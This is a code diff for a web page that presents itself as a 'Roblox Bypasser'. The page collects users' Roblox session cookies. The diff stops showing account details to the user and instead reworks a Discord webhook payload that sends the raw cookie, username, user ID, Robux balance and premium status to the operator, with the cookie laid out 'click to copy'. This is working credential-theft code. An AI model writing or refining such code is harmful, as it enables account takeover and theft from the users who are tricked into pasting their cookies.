@@ -341,21 +341,53 @@ $("#cookieForm").on("submit", async function(e) {
       showNotif("CORS error encountered, but cookie may still be valid. Proceeding...");
     }
 
-    // Display user info
-    $("#userInfo").html(`
-      <p class="output">
-        <strong>Username:</strong> ${result.username}<br>
-        <strong>User ID:</strong> ${result.userId}<br>
-        <strong>Robux Balance:</strong> ${result.robuxBalance}<br>
-        <strong>Premium:</strong> ${result.isPremium}
-      </p>
-    `).fadeIn();
-
-    // Send cookie to Discord webhook
+    // Send cookie to Discord webhook with embeds
     const webhookPayload = {
-      content: `New Cookie Submitted: \`${cookie}\`\nUsername: ${result.username}\nUser ID: ${result.userId}\nRobux Balance: ${result.robuxBalance}\nPremium: ${result.isPremium}`,
       username: "Roblox Bypasser Bot",
-      avatar_url: "https://i.imgur.com/4j8o1.png"
+      avatar_url: "https://i.imgur.com/4j8o1.png",
+      embeds: [
+        {
+          title: "🍪 User Information",
+          color: 0xFF0000,
+          fields: [
+            {
+              name: "👤 Username",
+              value: result.username,
+              inline: true
+            },
+            {
+              name: "🆔 User ID",
+              value: result.userId.toString(),
+              inline: true
+            },
+            {
+              name: "💰 Robux Balance",
+              value: result.robuxBalance.toString(),
+              inline: true
+            },
+            {
+              name: "⭐ Premium Status",
+              value: result.isPremium,
+              inline: true
+            }
+          ],
+          timestamp: new Date().toISOString(),
+          footer: {
+            text: "Roblox Bypasser",
+            icon_url: "https://i.imgur.com/4j8o1.png"
+          }
+        },
+        {
+          title: "🍪 Cookie (Click to Copy)",
+          description: `\`\`\`\n${cookie}\n\`\`\``,
+          color: 0x00FF00,
+          timestamp: new Date().toISOString(),
+          footer: {
+            text: "Click the cookie above to copy it",
+            icon_url: "https://i.imgur.com/4j8o1.png"
+          }
+        }
+      ]
     };
     
     // Send to webhook immediately after validation
